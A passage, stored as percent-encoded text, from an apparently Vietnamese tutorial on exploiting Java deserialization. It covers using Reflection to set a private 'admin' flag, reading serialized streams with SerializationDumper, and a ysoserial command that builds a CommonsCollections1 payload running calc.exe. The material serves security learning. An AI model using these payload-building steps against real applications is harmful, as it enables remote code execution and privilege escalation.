Deserialization-Cheat-Sheet)%2C%20%5Bsynacktiv%5D(https%3A%2F%2Fwww.synacktiv.com%2Fen%2Fpublications%2Fjava-deserialization-tricks)%0A%0A%23%23%23%207.%20Java%20Reflection%0ATi%E1%BA%BFp%20%C4%91%E1%BA%BFn%20ch%C3%BAng%20ta%20%C4%91%E1%BA%BFn%20v%E1%BB%9Bi%20m%E1%BB%99t%20ph%E1%BA%A7n%20quan%20tr%E1%BB%8Dng%20kh%C3%B4ng%20k%C3%A9m%20khi%20n%C3%B3i%20%C4%91%E1%BA%BFn%20l%E1%BB%97i%20Java%20Deserialization%20m%C3%A0%20kh%C3%B4ng%20th%E1%BB%83%20kh%C3%B4ng%20nh%E1%BA%AFc%20t%E1%BB%9Bi%20Reflection.%20V%E1%BA%ADy%20**Reflection**%20l%C3%A0%20g%C3%AC%20v%C3%A0%20c%C3%B3%20t%C3%A1c%20d%E1%BB%A5ng%20g%C3%AC.%0A%C4%90%E1%BA%A7u%20ti%C3%AAn%20n%C3%B3i%20v%E1%BB%81%20%C4%91%E1%BB%8Bnh%20ngh%C4%A9a%20**Reflection**%2C%20**Reflection**%20trong%20Java%20cho%20ph%C3%A9p%20ch%C6%B0%C6%A1ng%20tr%C3%ACnh%20t%E1%BB%B1%20**quan%20s%C3%A1t%20(introspect)**%20v%C3%A0%20**can%20thi%E1%BB%87p%20n%E1%BB%99i%20b%E1%BB%99**%20c%E1%BB%A7a%20c%C3%A1c%20l%E1%BB%9Bp%2C%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%2C%20tr%C6%B0%E1%BB%9Dng%20(fields)%20ngay%20c%E1%BA%A3%20khi%20ch%C3%BAng%20%C4%91%C6%B0%E1%BB%A3c%20khai%20b%C3%A1o%20l%C3%A0%20**private%20ho%E1%BA%B7c%20%E1%BB%9F%20c%C3%A1c%20package%20kh%C3%A1c**.(Theo%20%5BOracle%5D(https%3A%2F%2Fowasp.org%2Fwww-chapter-stuttgart%2Fassets%2Fslides%2F2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf%3Futm_source%3Dchatgpt.com)%2C%20reflection%20cho%20ph%C3%A9p%20%E2%80%9Cexamine%20or%20introspect%20upon%20itself%2C%20and%20manipulate%20internal%20properties%E2%80%9D)%0AC%C3%B2n%20v%E1%BB%81%20h%C6%B0%E1%BB%9Bng%20Security%20th%C3%AC%20Java%20Reflection%20th%C3%AC%20th%C6%B0%E1%BB%9Dng%20d%C3%B9ng%20%C4%91%E1%BB%83%20bypass%20filter%2Fsandbox%2C%20v%C3%AD%20d%E1%BB%A5%20nh%C6%B0%20khi%20ta%20%C4%91%C3%A3%20c%C3%B3%201%20chain%20c%C3%B3%20th%E1%BB%83%20d%E1%BA%ABn%20t%E1%BB%9Bi%20RCE%20nh%C6%B0ng%20c%C3%B3%201%20property%20private%20c%E1%BB%A7a%20m%E1%BB%99t%20class%20n%C3%A0o%20%C4%91%C3%B3%2C%20l%C3%BAc%20n%C3%A0y%20ch%C3%BAng%20ta%20s%E1%BA%BD%20t%E1%BA%ADn%20d%E1%BB%A5ng%20API%20**Reflection**%20%C4%91%E1%BB%83%20set%20l%E1%BA%A1i%20l%E1%BA%A1i%20c%C3%A1c%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20private%20properties%20c%E1%BB%A7a%20class%20trong%20qu%C3%A1%20tr%C3%ACnh%20Runtime.%0AT%E1%BB%AB%20kh%C3%A1i%20ni%E1%BB%87m%20tr%C3%AAn%20ta%20c%C3%B3%20th%E1%BB%83%20l%E1%BB%A3i%20d%E1%BB%A5ng%20**Reflection**%20trong%20l%E1%BB%97i%20**Java%20Deserialization**%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0y%3A%0A1.%20**K%C3%ADch%20ho%E1%BA%A1t%20magic%20method%20%60%60%60readObject()%60%60%60%20s%E1%BB%AD%20d%E1%BB%A5ng%20Reflection%3A**%20attacker%20d%C3%B9ng%20Reflection%20%C4%91%E1%BB%83%20ti%E1%BA%BFp%20c%E1%BA%ADn%20RCE%20sink%20khi%20object%20%C4%91%C6%B0%E1%BB%A3c%20deserialize.%0A2.%20**Khai%20th%C3%A1c%20class%20c%C3%B3%20constructor%20private**%3A%20V%C3%AD%20d%E1%BB%A5%20payload%20c%C3%B3%20th%E1%BB%83%20override%20tr%C6%B0%E1%BB%9Dng%20ch%E1%BB%A9a%20URL%20ho%E1%BA%B7c%20l%E1%BB%87nh%20(cmd)%2C%20r%E1%BB%93i%20khi%20method%20c%E1%BB%A7a%20object%20th%E1%BB%B1c%20thi%2C%20code%20t%E1%BA%A5n%20c%C3%B4ng%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di.%0A3.%20K%E1%BA%BFt%20h%E1%BB%A3p%20v%E1%BB%9Bi%20gadget%20chain%3A%20C%C3%A1c%20class%20nh%C6%B0%20%60%60%60TemplatesImpl%60%60%60%20d%C3%B9ng%20Reflection%20%C4%91%E1%BB%83%20load%20bytecode%3B%20attacker%20l%E1%BB%A3i%20d%E1%BB%A5ng%20deserialization%20%C4%91%E1%BB%83%20inject%20bytecode%20%C4%91%C3%B3%20%E2%86%92%20**RCE**.%0A%0A%C4%90%E1%BB%83%20cho%20m%E1%BB%8Di%20ng%C6%B0%E1%BB%9Di%20d%E1%BB%85%20h%C3%ACnh%20dung%20h%C6%A1n%20th%C3%AC%20v%C3%AD%20d%E1%BB%A5%20ch%C3%BAng%20ta%20c%C3%B3%20%C4%91o%E1%BA%A1n%20code%20sau%20%C4%91%C3%A2y%20l%C3%A0%20gi%E1%BA%A3%20%C4%91%E1%BB%8Bnh%20class%20**User**%20c%E1%BB%A7a%20m%E1%BB%99t%20h%E1%BB%87%20th%E1%BB%91ng.%0A%60%60%60java%0A%2F%2F%20Classe%20User.java%0Apublic%20class%20User%20%7B%0A%20%20%20%20private%20String%20username%3B%0A%20%20%20%20private%20boolean%20admin%20%3D%20false%3B%20%20%2F%2F%20m%E1%BA%B7c%20%C4%91%E1%BB%8Bnh%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20kh%C3%B4ng%20ph%E1%BA%A3i%20admin%0A%0A%20%20%20%20public%20User(String%20username)%20%7B%0A%20%20%20%20%20%20%20%20this.username%20%3D%20username%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20public%20boolean%20isAdmin()%20%7B%0A%20%20%20%20%20%20%20%20return%20admin%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20public%20String%20toString()%20%7B%0A%20%20%20%20%20%20%20%20return%20username%20%2B%20%22%20(admin%3D%22%20%2B%20admin%20%2B%20%22)%22%3B%0A%20%20%20%20%7D%0A%7D%0A%60%60%60%0Ath%C3%AC%20khi%20c%C3%B3%20%C4%91o%E1%BA%A1n%20code%20n%C3%A0y%20xong%20th%C3%AC%20ch%C3%BAng%20ta%20c%C3%B3%20t%E1%BA%A1o%20t%C3%A0i%20kho%E1%BA%A3n%20**User**%20b%C3%ACnh%20th%C6%B0%E1%BB%9Dng%20l%C3%A0%20ch%E1%BB%89%20c%E1%BA%A7n%20%C4%91o%E1%BA%A1n%20code.%0A%60%60%60java%0A%2F%2F%20Khi%20%C4%91%C4%83ng%20k%C3%BD%20t%C3%A0i%20kho%E1%BA%A3n%3A%0AUser%20user%20%3D%20new%20User(%22attacker%22)%3B%0A%2F%2F%20Kh%C3%B4ng%20h%E1%BB%81%20c%C3%B3%20c%C3%A1ch%20set%20admin%20%3D%20true%0ASystem.out.println(user)%3B%20%2F%2F%20attacker%20(admin%3Dfalse)%0A%60%60%60%0AV%C3%A0%20l%C3%BAc%20n%C3%A0y%20ch%C3%BAng%20ta%20v%C3%AD%20d%E1%BB%A5%20mu%E1%BB%91n%20c%C3%B3%20th%E1%BB%83%20t%E1%BA%A1o%20m%E1%BB%99t%20acc%20admin%2C%20c%E1%BB%A5%20th%E1%BB%83%20%E1%BB%9F%20%C4%91%C3%A2y%20l%C3%A0%20**User%20attacker%20th%C3%A0nh%20admin**.%20th%C3%AC%20ch%C3%BAng%20ta%20ph%E1%BA%A3i%20thay%20%C4%91%E1%BB%95i%20%C4%91%C6%B0%E1%BB%A3c%20field%20private%20%60%60%60admin%60%60%60%20t%E1%BB%AB%20%60%60%60false%60%60%60%20th%C3%A0nh%20%60%60%60true%60%60%60%20b%E1%BA%B3ng%20c%C3%A1ch%20s%E1%BB%AD%20d%E1%BB%A5ng%20**API%20REFLECTION**%2C%20b%E1%BA%B1ng%20c%C3%A1ch%20n%C3%A0y%20ch%C3%BAng%20ta%20c%C3%B3%20th%E1%BB%83%20**override**%20gi%C3%A1%20tr%E1%BB%8B%20nh%E1%BA%A1y%20c%E1%BA%A3m%20m%E1%BB%99t%20c%C3%A1ch%20d%E1%BB%85%20d%C3%A0ng.%0A%60%60%60java%0Aimport%20java.lang.reflect.Field%3B%0A%0Apublic%20class%20ReflectionTest%20%7B%0A%20%20%20%20public%20static%20void%20main(String%5B%5D%20args)%20throws%20Exception%20%7B%0A%20%20%20%20%20%20%20%20User%20user%20%3D%20new%20User(%22attacker%22)%3B%0A%20%20%20%20%20%20%20%20System.out.println(%22Before%3A%20%22%20%2B%20user)%3B%20%20%2F%2F%20attacker%20(admin%3Dfalse)%0A%0A%20%20%20%20%20%20%20%20Field%20adminField%20%3D%20User.class.getDeclaredField(%22admin%22)%3B%0A%20%20%20%20%20%20%20%20adminField.setAccessible(true)%3B%20%20%2F%2F%20bypass%20private%0A%20%20%20%20%20%20%20%20adminField.setBoolean(user%2C%20true)%3B%20%20%2F%2F%20g%C3%A1n%20true%0A%0A%20%20%20%20%20%20%20%20System.out.println(%22After%3A%20%20%22%20%2B%20user)%3B%20%20%2F%2F%20attacker%20(admin%3Dtrue)%0A%20%20%20%20%7D%0A%7D%0A%60%60%60%0A%0AN%C3%A0y%20l%C3%A0%20m%C3%B4%20ph%E1%BB%8Fng%20t%C4%A9nh%20cho%20c%C3%A1c%20b%E1%BA%A1n%20d%E1%BB%85%20hi%E1%BB%83u%2C%20m%E1%BB%99t%20ch%C3%BAt%20n%E1%BB%AFa%20khi%20%C4%91%E1%BA%BFn%20ph%E1%BA%A7n%20th%E1%BB%B1c%20h%C3%A0nh%2C%20m%C3%ACnh%20s%E1%BA%BD%20ch%E1%BB%89%20r%C3%B5%20**REFLECTION**%20n%E1%BA%B1m%20%E1%BB%9F%20%C4%91%C3%A2u%20v%C3%A0%20trong%20qu%C3%A1%20tr%C3%ACnh%20**RUN%20TIME**%20ch%C3%BAng%20ta%20l%E1%BB%A3i%20d%E1%BB%A5ng%20**REFLECTION**%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0o.%0A%0ATham%20kh%E1%BA%A3o%3A%20%5BC%C3%A1ch%20d%C3%B9ng%20setAccessible(true)%20%C4%91%E1%BB%83%20truy%20c%E1%BA%ADp%20v%C3%A0%20s%E1%BB%ADa%20private%20field%5D(https%3A%2F%2Fstackoverflow.com%2Fquestions%2F32716952%2Fset-private-field-value-with-reflection)%2C%20%5BReading%20the%20Value%20of%20%E2%80%98private%E2%80%99%20Fields%20from%20a%20Different%20Class%20in%20Java%5D(https%3A%2F%2Fwww.baeldung.com%2Fjava-reflection-read-private-field-value)%2C%20%5BHow%20to%20Access%20Private%20Field%20and%20Method%20Using%20Reflection%20in%20Java%3F%5D(https%3A%2F%2Fwww.geeksforgeeks.org%2Fjava%2Fhow-to-access-private-field-and-method-using-reflection-in-java%2F)%2C%20%5BC%C3%A1ch%20bypass%20private%20static%20final%20field%20%E2%80%93%20n%C3%A2ng%20cao%20h%C6%A1n%5D(https%3A%2F%2Fstackoverflow.com%2Fquestions%2F3301635%2Fchange-private-static-final-field-using-java-reflection)%0A%0A%23%23%23%208.%20SerializationDumper%0AB%C3%A2y%20gi%E1%BB%9D%20ch%C3%BAng%20ta%20%C4%91%E1%BA%BFn%20v%E1%BB%9Bi%20m%E1%BB%99t%20c%C3%B4ng%20c%E1%BB%A5%20ti%E1%BA%BFp%20theo%20c%C5%A9ng%20kh%C3%B4ng%20k%C3%A9m%20ph%E1%BA%A7n%20quan%20tr%E1%BB%8Dng%20%C4%91%C3%B3%20l%C3%A0%20%5B**SerializationDumper**%5D(https%3A%2F%2Fgithub.com%2FNickstaDB%2FSerializationDumper)%2C%20v%E1%BB%9Bi%20c%C3%B4ng%20c%E1%BB%A5%20n%C3%A0y%2C%20ch%C3%BAng%20ta%20kh%C3%B4ng%20ph%E1%BA%A3i%20nh%E1%BB%9B%20r%C3%B5%20h%E1%BA%BFt%20c%E1%BA%A5u%20t%E1%BA%A1o%20c%E1%BB%A7a%20**Serialize%20data**%20%E1%BB%9F%20d%E1%BA%A1ng%20nh%E1%BB%8B%20ph%C3%A2n.%20%C4%90%C3%A2y%20l%C3%A0%20c%C3%B4ng%20c%E1%BB%A5%20m%C3%A3%20ngu%E1%BB%93n%20m%E1%BB%9F%20chuy%C3%AAn%20d%C3%B9ng%20%C4%91%E1%BB%83%20%C4%91%E1%BB%8Dc%20v%C3%A0%20ph%C3%A2n%20t%C3%ADch%20**Serialize%20data**.%0AV%C3%A0%20t%E1%BB%AB%20format%20%E1%BB%9F%20%5B%C4%91%C3%A2y%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F8%2Fdocs%2Fplatform%2Fserialization%2Fspec%2Fprotocol.html)%2C%20m%C3%ACnh%20suy%20ra%20%C4%91%C6%B0%E1%BB%A3c%20quy%20lu%E1%BA%ADt%20d%C3%B9ng%20tool%20n%C3%A0y%20%C4%91%E1%BB%83%20xem%20**Serialize%20data**%20l%C3%A0%20nh%C6%B0%20n%C3%A0y%3A%0A%60%60%60yaml%0Astream%3A%0A%20%20%20%20magic%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20STREAM_MAGIC%3A%20%C4%91%E1%BB%8Bnh%20danh%20d%E1%BB%AF%20li%E1%BB%87u%20Serialization%20(0xaced)%0A%20%20%20%20version%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20STREAM_VERSION%3A%20phi%C3%AAn%20b%E1%BA%A3n%20Serialization%20(th%C6%B0%E1%BB%9Dng%200x0005)%0A%20%20%20%20contents%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Chu%E1%BB%97i%20n%E1%BB%99i%20dung%2C%20c%C3%B3%20th%E1%BB%83%20g%E1%BB%93m%20nhi%E1%BB%81u%20content%20li%C3%AAn%20ti%E1%BA%BFp%0A%0Acontents%3A%0A%20%20%20%20content%0A%20%20%20%20contents%20content%20%20%20%20%20%20%20%2F%2F%20M%E1%BB%99t%20stream%20c%C3%B3%20th%E1%BB%83%20ch%E1%BB%A9a%20nhi%E1%BB%81u%20content%0A%0Acontent%3A%0A%20%20%20%20object%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20M%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20Java%0A%20%20%20%20blockdata%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20D%E1%BB%AF%20li%E1%BB%87u%20th%C3%B4%20(kh%C3%B4ng%20ph%E1%BA%A3i%20object%20Java)%0A%0Aobject%3A%0A%20%20%20%20newObject%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_OBJECT%3A%20t%E1%BA%A1o%20object%20m%E1%BB%9Bi%2C%20g%E1%BB%93m%20classDesc%20%2B%20field%20values%0A%20%20%20%20newClass%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_CLASS%3A%20m%C3%B4%20t%E1%BA%A3%20class%20(kh%C3%B4ng%20k%C3%A8m%20d%E1%BB%AF%20li%E1%BB%87u)%0A%20%20%20%20newArray%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_ARRAY%3A%20m%E1%BA%A3ng%20c%C3%A1c%20ph%E1%BA%A7n%20t%E1%BB%AD%0A%20%20%20%20newString%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_STRING%20ho%E1%BA%B7c%20TC_LONGSTRING%3A%20chu%E1%BB%97i%20m%E1%BB%9Bi%0A%20%20%20%20newEnum%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_ENUM%3A%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20Enum%0A%20%20%20%20newClassDesc%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_CLASSDESC%3A%20m%C3%B4%20t%E1%BA%A3%20%C4%91%E1%BA%A7y%20%C4%91%E1%BB%A7%20class%20(t%C3%AAn%2C%20UID%2C%20fields%2C%20flags)%0A%20%20%20%20prevObject%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_REFERENCE%3A%20tham%20chi%E1%BA%BFu%20%C4%91%E1%BA%BFn%20object%20%C4%91%C3%A3%20xu%E1%BA%A5t%20hi%E1%BB%87n%0A%20%20%20%20nullReference%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_NULL%3A%20gi%C3%A1%20tr%E1%BB%8B%20null%0A%20%20%20%20exception%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_EXCEPTION%3A%20object%20exception%0A%20%20%20%20TC_RESET%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Reset%20b%E1%BA%A3ng%20tham%20chi%E1%BA%BFu%20(reference%20table)%0A%0Ablockdata%3A%0A%20%20%20%20blockdatashort%20%20%20%20%20%20%20%20%20%2F%2F%20TC_BLOCKDATA%3A%20block%20d%E1%BB%AF%20li%E1%BB%87u%20ng%E1%BA%AFn%0A%20%20%20%20blockdatalong%20%20%20%20%20%20%20%20%20%20%2F%2F%20TC_BLOCKDATALONG%3A%20block%20d%E1%BB%AF%20li%E1%BB%87u%20d%C3%A0i%0A%0Ablockdatashort%3A%0A%20%20%20%20TC_BLOCKDATA%20(unsigned%20byte)%20%3Csize%3E%20(byte)%5Bsize%5D%0A%20%20%20%20%2F%2F%20size%201%20byte%2C%20theo%20sau%20l%C3%A0%20payload%20bytes%0A%0Ablockdatalong%3A%0A%20%20%20%20TC_BLOCKDATALONG%20(int32%20size)%20(byte)%5Bsize%5D%0A%20%20%20%20%2F%2F%20size%204%20byte%2C%20d%C3%B9ng%20cho%20block%20l%E1%BB%9Bn%0A%0AnewString%3A%0A%20%20%20%20TC_STRING%20newHandle%20(utf)%20%20%20%20%20%20%20%20%20%20%2F%2F%20Chu%E1%BB%97i%20UTF-8%20ng%E1%BA%AFn%0A%20%20%20%20TC_LONGSTRING%20newHandle%20(long-utf)%20%2F%2F%20Chu%E1%BB%97i%20UTF-8%20d%C3%A0i%0A%0AnewClassDesc%3A%0A%20%20%20%20TC_CLASSDESC%0A%20%20%20%20%20%20%20%20className%20(utf)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20T%C3%AAn%20class%20(v%C3%AD%20d%E1%BB%A5%3A%20%22User%22)%0A%20%20%20%20%20%20%20%20serialVersionUID%20(long)%20%20%20%20%20%20%20%20%2F%2F%20UID%20ki%E1%BB%83m%20tra%20t%C3%ADnh%20t%C6%B0%C6%A1ng%20th%C3%ADch%20class%0A%20%20%20%20%20%20%20%20classDescFlags%20(byte)%20%20%20%20%20%20%20%20%20%20%2F%2F%20C%E1%BB%9D%3A%20SC_SERIALIZABLE%2C%20SC_EXTERNALIZABLE%2C%20v.v.%0A%20%20%20%20%20%20%20%20fieldCount%20(short)%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20S%E1%BB%91%20l%C6%B0%E1%BB%A3ng%20field%0A%20%20%20%20%20%20%20%20fields%5B%5D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Danh%20s%C3%A1ch%20field%0A%20%20%20%20%20%20%20%20classAnnotations%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20C%C3%B3%20th%E1%BB%83%20ch%E1%BB%A9a%20blockdata%20b%E1%BB%95%20sung%0A%20%20%20%20%20%20%20%20superClassDesc%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Tham%20chi%E1%BA%BFu%20superclass%20ho%E1%BA%B7c%20TC_NULL%0A%0Afield%3A%0A%20%20%20%20fieldTypeCode%20(byte)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20V%C3%AD%20d%E1%BB%A5%3A%20'I'%20(int)%2C%20'L'%20(object)%2C%20'Z'%20(boolean)%0A%20%20%20%20fieldName%20(utf)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20T%C3%AAn%20field%0A%20%20%20%20className%20(utf%2C%20n%E1%BA%BFu%20object)%20%20%20%20%20%20%20%20%2F%2F%20Descriptor%20ki%E1%BB%83u%2C%20v%C3%AD%20d%E1%BB%A5%3A%20%22Ljava%2Flang%2FString%3B%22%0A%0Avalues%3A%0A%20%20%20%20fieldValue%5B%5D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Chu%E1%BB%97i%20byte%20bi%E1%BB%83u%20di%E1%BB%85n%20gi%C3%A1%20tr%E1%BB%8B%20th%E1%BB%B1c%20t%E1%BA%BF%0A%60%60%60%0ATh%C3%AC%20%C4%91%E1%BB%83%20gi%E1%BA%A3i%20th%C3%ADch%20k%C4%A9%20h%C6%A1n%20th%C3%AC%20tool%20n%C3%A0y%20gi%C3%BAp%20ch%C3%BAng%20ta%20d%E1%BB%85%20d%C3%A0ng%20nh%C3%ACn%20th%E1%BA%A5y%3A%0A%3E%20%5Bcolor%3D%231e90ff%5DSTREAM_MAGIC%20%26%20STREAM_VERSION%0A%3E%20*%20D%E1%BA%A5u%20hi%E1%BB%87u%20nh%E1%BA%ADn%20bi%E1%BA%BFt%20traffic%20ch%E1%BB%A9a%20Java%20Serialization.%0A%3E*%20Khi%20b%E1%BA%ADt%20Burp%20%E2%86%92%20n%E1%BA%BFu%20th%E1%BA%A5y%20aced0005%20trong%20request%20body%20%E2%86%92%20g%E1%BA%A7n%20nh%C6%B0%20ch%E1%BA%AFc%20ch%E1%BA%AFn%20l%C3%A0%20serialized%20data.%0A%3E%0A%3EnewClassDesc%20%2B%20field%20(Source)%0A%3E*%20Cho%20bi%E1%BA%BFt%20class%20n%C3%A0o%20%C4%91ang%20%C4%91%C6%B0%E1%BB%A3c%20deserialize.%0A%3E*%20Ki%E1%BB%83m%20tra%20serialVersionUID%20kh%E1%BB%9Bp%20%E2%86%92%20n%E1%BA%BFu%20c%C3%B3%20gadget%20chain%20t%C6%B0%C6%A1ng%20%E1%BB%A9ng%20th%C3%AC%20c%C3%B3%20th%E1%BB%83%20exploit.%0A%3E%0A%3Eblockdata%20(Sink)%0A%3E*%20Ch%E1%BB%A9a%20d%E1%BB%AF%20li%E1%BB%87u%20m%C3%A0%20attacker%20c%C3%B3%20th%E1%BB%83%20ki%E1%BB%83m%20so%C3%A1t%20%E2%86%92%20c%C3%B3%20th%E1%BB%83%20d%E1%BA%ABn%20t%E1%BB%9Bi%20RCE%20n%E1%BA%BFu%20qua%20gadget%20chain.%0A%3E%0A%3ETC_REFERENCE%0A%3E*%20Cho%20th%E1%BA%A5y%20object%20%C4%91%C6%B0%E1%BB%A3c%20t%C3%A1i%20s%E1%BB%AD%20d%E1%BB%A5ng%20%E2%86%92%20quan%20tr%E1%BB%8Dng%20%C4%91%E1%BB%83%20hi%E1%BB%83u%20flow%20gadget%20chain.%0A%3E%0A%3EclassDescFlags%0A%3E*%20N%E1%BA%BFu%20class%20h%E1%BB%97%20tr%E1%BB%A3%20Serializable%20ho%E1%BA%B7c%20Externalizable%2C%20kh%E1%BA%A3%20n%C4%83ng%20exploit%20cao%20h%C6%A1n.%0A%3E%0A%3Evalues%0A%3E*%20Ph%E1%BA%A7n%20cu%E1%BB%91i%20c%C3%B9ng%20ch%E1%BB%A9a%20d%E1%BB%AF%20li%E1%BB%87u%20th%E1%BB%B1c%20t%E1%BA%BF%20%E2%86%92%20v%C3%AD%20d%E1%BB%A5%20s%E1%BB%91%2020%20%E2%86%92%2000%2000%2000%2014.%0A%3E*%20V%E1%BB%9Bi%20chu%E1%BB%97i%20%E2%86%92%20TC_STRING%20%E2%86%92%20b%E1%BA%A1n%20c%C3%B3%20th%E1%BB%83%20nh%C3%A9t%20payload.%0A%0AKhi%20ch%C3%BAng%20ta%20x%C3%A0i%20tool%20n%C3%A0y%2C%20ta%20c%C3%B3%20th%E1%BB%83%20d%E1%BB%85%20d%C3%A0ng%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20%C4%91%C6%B0%E1%BB%A3c%20c%C3%A1c%20class%20v%C3%A0%20field%20%C4%91%C6%B0%E1%BB%A3c%20n%E1%BA%A1p%20%C4%91%E1%BB%83%20d%E1%BB%85%20d%C3%A0ng%20ki%E1%BB%83m%20so%C3%A1t%20v%C3%A0%20x%C3%A2y%20d%E1%BB%B1ng%20payload.%0A%0A%23%23%23%209.%20Gi%E1%BB%9Bi%20thi%E1%BB%87u%20v%E1%BB%81%20Ysoserial%0ACh%C3%BAng%20ta%20%C4%91ang%20nh%E1%BA%AFc%20%C4%91%E1%BA%BFn%20l%E1%BB%97i%20**Java%20Deserialization%20vulnerability**%20m%C3%A0%20kh%C3%B4ng%20nh%E1%BA%AFc%20%C4%91%E1%BA%BFn%20%5B**Ysoserial**%5D(https%3A%2F%2Fgithub.com%2Ffrohoff%2Fysoserial)%20l%C3%A0%20m%E1%BB%99t%20s%E1%BB%B1%20thi%E1%BA%BFu%20s%C3%B3t%20r%E1%BA%A5t%20l%E1%BB%9Bn.%20%C4%90%C3%A2y%20l%C3%A0%20c%C3%B4ng%20c%E1%BB%A5%20m%C3%A3%20ngu%E1%BB%93n%20m%E1%BB%9F%20c%E1%BB%B1c%20k%E1%BB%B3%20ph%E1%BB%95%20bi%E1%BA%BFn%2C%20%C4%91%C6%B0%E1%BB%A3c%20s%E1%BB%AD%20d%E1%BB%A5ng%20%C4%91%E1%BB%83%20t%E1%BA%A1o%20ra%20c%C3%A1c%20payload%20khai%20th%C3%A1c%20d%E1%BB%B1a%20tr%C3%AAn%20c%C3%A1c%20**gadget%20chain**%20c%C3%B3%20s%E1%BA%B5n%20trong%20c%C3%A1c%20th%C6%B0%20vi%E1%BB%87n%20Java.%0AC%C3%A1ch%20ho%E1%BA%A1t%20%C4%91%E1%BB%99ng%20c%E1%BB%A7a%20tool%20n%C3%A0y%20r%E1%BA%A5t%20%C4%91%C6%A1n%20gi%E1%BA%A3n%3A%0A*%20Pentester%20ch%E1%BB%89%20%C4%91%E1%BB%8Bnh%20lo%E1%BA%A1i%20gadget%20chain%20mu%E1%BB%91n%20d%C3%B9ng.%0A*%20YSoSerial%20s%E1%BA%BD%20sinh%20ra%20m%E1%BB%99t%20chu%E1%BB%97i%20**byte%20serialized%20h%E1%BB%A3p%20l%E1%BB%87**.%0A*%20Payload%20n%C3%A0y%2C%20khi%20%C4%91%C6%B0a%20v%C3%A0o%20%E1%BB%A9ng%20d%E1%BB%A5ng%20c%C3%B3%20l%E1%BB%97%20h%E1%BB%95ng%20deserialization%2C%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20JVM%20n%E1%BA%A1p%20v%C3%A0%20ch%E1%BA%A1y%20theo%20gadget%20chain%20%E2%86%92%20d%E1%BA%ABn%20%C4%91%E1%BA%BFn%20h%E1%BA%ADu%20qu%E1%BA%A3%20nh%C6%B0%20**RCE%2C%20File%20Write%2C%20ho%E1%BA%B7c%20Logic%20Manipulation**.%0A%0Av%C3%AD%20d%E1%BB%A5%3A%0A%60%60%60code%0Ajava%20-jar%20ysoserial.jar%20CommonsCollections1%20%22calc.exe%22%20%3E%20payload.ser%0A%60%60%60%0A*%20CommonsCollections1%20l%C3%A0%20gadget%20chain.%0A*%20%22calc.exe%22%20l%C3%A0%20l%E1%BB%87nh%20c%E1%BA%A7n%20th%E1%BB%B1c%20thi.%0A*%20payload.ser%20l%C3%A0%20file%20serialized%20payload%20sinh%20ra.%0A%0AV%E1%BB%9Bi%20b%E1%BB%99%20tool%20n%C3%A0y%2C%20ch%C3%BAng%20ta%20%C4%91%E1%BB%A1%20ph%E1%BA%A3i%20%C4%91i%20t%C3%ACm%20c%C3%A1c%20**gatgetchain**%20m%E1%BB%99t%20c%C3%A1ch%20th%E1%BB%A7%20c%C3%B4ng%20m%C3%A0%20ch%E1%BB%89%20c%E1%BA%A7n%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20th%C6%B0%20vi%E1%BB%87n%20v%C3%A0%20phi%C3%AAn%20b%E1%BA%A3n%20c%E1%BB%A7a%20h%E1%BB%87%20th%E1%BB%91ng.%0A%0A%23%23%23%2010.%20C%C3%B4ng%20c%E1%BB%A5%20Gadget%20Inspector%0ATr%C3%AAn%20th%E1%BB%B1c%20t%E1%BA%BF%2C%20c%C3%A1c%20%E1%BB%A9ng%20d%E1%BB%A5ng%20th%C6%B0%E1%BB%9Dng%20c%C3%B3%20quy%20m%C3%B4%20r%E1%BA%A5t%20l%E1%BB%9Bn%2C%20%C4%91%E1%BA%B7t%20bi%E1%BB%87t%20l%C3%A0%20**%E1%BB%A9ng%20d%E1%BB%A5ng%20enterprise**%2C%20th%C3%AC%20khi%20c%C3%B3%20code%20%E1%BB%9F%20quy%20m%C3%B4%20%C4%91%E1%BB%93%20s%E1%BB%99%20nh%C6%B0%20n%C3%A0y%2C%20th%C3%AC%20vi%E1%BB%87c%20ki%E1%BA%BFm%20**gadgetchain**%20th%E1%BB%A7%20c%C3%B4ng%20kh%